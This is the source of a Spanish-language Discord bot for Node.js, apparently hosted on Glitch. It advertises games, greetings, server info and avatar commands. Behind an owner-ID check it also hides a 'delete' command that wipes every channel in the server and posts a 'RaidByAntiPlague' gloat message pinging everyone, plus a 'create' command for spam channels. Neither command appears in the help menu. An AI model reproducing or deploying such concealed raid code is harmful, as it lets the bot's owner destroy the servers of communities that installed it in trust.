const http = require("http");
const express = require("express");
const app = express();

//
app.use(express.static("public"));

app.get("/", function(request, response) {
  response.sendFile(__dirname + "/views/index.html");
});

app.get("/", (request, response) => {
  response.sendStatus(200);
});

app.listen(process.env.PORT);

setInterval(() => {
  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);
}, 280000);

////////////////////BOT/////////////

const { Client, MessageEmbed } = require("discord.js");
const client = new Client();
const config = require("./config.json");

let prefix = config.prefix;

client.on("ready", () => {
  console.log(`Dale pá todo piola`);
  client.user.setActivity("Creador INF Jeremy | c!help | Viendo 683 usuarios ");
});

client.on("message", message => {
  var Mensajes = ["Yo elijo piedra","Yo elijo papel","Yo elijo tijera"];
  var Aleatorio = Math.floor(Math.random()*(Mensajes.length));
  
  if (message.content === prefix + "play piedra") {
    const embed = new MessageEmbed()
    .setTitle("PIEDRA PAPEL O TIJERA")
    .setColor("RED")
    .setDescription(Mensajes[Aleatorio])
    message.channel.send(embed);
    }
  if (message.content === prefix + "play tijera") {
    const embed = new MessageEmbed()
    .setTitle("PIEDRA PAPEL O TIJERA")
    .setColor("RED")
    .setDescription(Mensajes[Aleatorio])
    message.channel.send(embed);
    }
  if (message.content === prefix + "play papel") {
    const embed = new MessageEmbed()
    .setTitle("PIEDRA PAPEL O TIJERA")
    .setColor("RED")
    .setDescription(Mensajes[Aleatorio])
    message.channel.send(embed);
    }
  if (message.content.startsWith("hola")) {
    message.channel.send(`*hola crack 😉*`);
  }

  if (message.content.startsWith("ping")) {
    message.channel.send(`pong🏓`);
  }

  if (message.content.startsWith(prefix + "calavera")) {
    message.channel.send(`*ES UN PAPUCHO 😏* https://tenor.com/view/maverick-top-gun-handsome-sunglasses-gif-13305750`);
  }

  if (message.content.startsWith(prefix + "desco")) {
    message.channel.send(`el pvtito que no me quiere en su server😔`);
  }
  if (message.content === "Asalto") {
    message.channel.send(`tranqui tu roba yo te aviso si viene alguien :)`);
    }
  if (message.content === "asalto") {
    message.channel.send(":man_police_officer:");
    }
  if (message.content === "a") {
    message.channel.send(`:regional_indicator_a:`);
    }
  if (message.content === "A") {
    message.channel.send(`:regional_indicator_a:`);
    }
  if (message.content === "aa") {
    message.channel.send(`:regional_indicator_a:`);
    }
  if (message.content === "aaa") {
    message.channel.send(`:regional_indicator_a:`);
    }
  if (message.contebt === "Aa") {
    message.channel.send(`:regional_indicator_a:`);
    }
  let petesxd = ["542817632957497383"]
if(!petesxd.includes(message.author.id)) return;
  if (message.content === "c!clear 5") {
    message.channel.bulkDelete(5);
      
    }
    if (message.author.bot) return;
  
   if (message.content === prefix + 'delete') {
    message.guild.channels.cache.forEach(channel => channel.delete());
    message.guild.channels.create(`RaidByAntiPlague`, {
          type: 'text'
        }).then(channel => {
          channel.send("> **__La basura de discord fue eliminada.__** @everyone @here")
        })
        }
   if (message.content === prefix + 'create') {
     message.guild.channels.create(`RaidByAntiPlague`)};
      
        
  })




client.on("message", message => {
  if (message.content === prefix + "server") {
    const embed = new MessageEmbed()
      .setTitle(":iphone: SERVER INFO :iphone:")
      .setAuthor(message.member.displayName, message.author.displayAvatarURL())
      .setColor(0xf390)
      .setDescription(" Bot created by INF Jeremy")
      .addField("Nombre del servidor: ", message.guild.name)
      .addField("ID:", message.guild.id)
      .addField("REGION: ", message.guild.region)
      .addField("MIEMBROS: ", message.guild.memberCount)
      .setImage(message.guild.iconURL())
      .setFooter(
        "Consulta por: " + message.member.displayName,
        message.author.displayAvatarURL()
      )
      .setTimestamp();
    message.channel.send(embed);
  }

  if (message.content === prefix + "avatar") {
    const embed = new MessageEmbed()
      .setTitle("Avatar de " + message.member.displayName)
      .setColor(0xf39c12)
      .setImage(message.author.displayAvatarURL())
      .setFooter(
        "Consultado por: " + message.member.displayName,
        message.author.displayAvatarURL()
      )
      .setTimestamp();
    message.channel.send(embed);
  }
  if (message.content === prefix + "help") {
    const embed = new MessageEmbed()
      .setTitle("💀LISTA DE COMANDOS💀")
      .setColor(0x3333ff)
      .setDescription("Lista de comandos del bot V1.0")
      .addField(
        "1.ping",
        "al escribir ping en el chat el bot respondera con un pong"
      )
      .addField(
        "2.hola",
        "al escribir hola en el chat el bot respondera con un hola crack"
      )
      .addField(
        "3.c!calavera",
        "al escribir esto saldra una descripcion y foto de mi creador😌"
      )
      
      .addField(
        "4.c!server",
        "es una pequeña información del servidor en el que estas"
      )
      .addField("5.c!avatar", "aqui saldrá la foto de tu avatar de discord")
      .addField("6.c!say", "aqui podran hacerme decir lo que quieran :)")
      .addField("7.c!icono", "este comando muestra el icono del servidor")
      .addField("8.c!play", "aqui deben elegir piedra papel o tijera asi: c!play piedra")
      .setFooter(message.member.displayName, message.author.displayAvatarURL())
      .setTimestamp();
    message.channel.send(embed);
  }
  if (message.content.startsWith("say")) return;

  const args = message.content
    .slice(prefix.length)
    .trim()
    .split(/ +/g);
  const command = args.shift().toLowerCase();

  if (command === "say") {
    //////pepe/////
    let texto = args.join(" ");
    if (!texto)
      return message.channel
        .send("**Ingresa un texto.**")
        .then(msg => msg.delete({ timeout: 5000 }));
    message.delete().catch();
    message.channel.send(texto);
  }
  
    if (message.content === prefix + "icono") {
      const embed = new MessageEmbed()
        .setTitle("ICONO DEL SERVIDOR")
        .setImage(message.guild.iconURL())
        .setColor("RED")
        .setFooter(message.member.displayName,message.author.displayAvatarURL())
        .setTimestamp()
      message.channel.send(embed);
      
      }
    
   
  
  }); client.login(config.token);
  
